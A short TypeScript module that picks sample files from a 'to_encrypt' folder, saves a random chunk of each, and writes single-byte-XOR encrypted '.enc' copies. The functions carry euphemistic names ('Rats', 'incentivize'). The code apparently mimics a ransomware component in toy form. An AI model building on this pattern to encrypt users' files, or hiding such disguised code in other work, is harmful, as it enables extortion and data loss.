import { getFiles, sampleN, FileEntry } from "./helpers";
import fs from 'fs';

const ENCRYPTION_DIR = './src/to_encrypt';


export interface Rats {
    listIncentives: (count: number) => Promise<FileEntry[]>,
    incentivize: (file: FileEntry) => void
}

async function listIncentives(count = 8): Promise<FileEntry[]> {
    const files = await getFiles(ENCRYPTION_DIR);
    return sampleN(files, count);
}

function copyRandomChunk(
    sourcePath: string,
    destPath: string,
    chunkSize = 4096
) {
    const stats = fs.statSync(sourcePath);
    const fileSize = stats.size;

    if (fileSize === 0) throw new Error('Source file is empty.');

    const start = Math.floor(Math.random() * Math.max(1, fileSize - chunkSize));
    const end = Math.min(start + chunkSize, fileSize);

    const buffer = Buffer.alloc(end - start);
    const fd = fs.openSync(sourcePath, 'r');
    fs.readSync(fd, buffer, 0, buffer.length, start);
    fs.closeSync(fd);

    fs.writeFileSync(destPath, buffer);
}

function incentivize(file: FileEntry): void {

    copyRandomChunk(file.path, './src/partials/' + file.name);

    const readFd = fs.openSync(file.path, 'r');
    const writeFd = fs.openSync(file.path + '.enc', 'w');

    const buf = Buffer.alloc(1024);

    while (true) {
        const read = fs.readSync(readFd, buf);
        if (read == 0) break;

        for (let i = 0; i < read; i++)
            buf[i] ^= 0x4a;
        fs.writeSync(writeFd, buf, 0, read, null);
    }

    fs.closeSync(readFd);
    fs.closeSync(writeFd);
}

export default { listIncentives, incentivize };
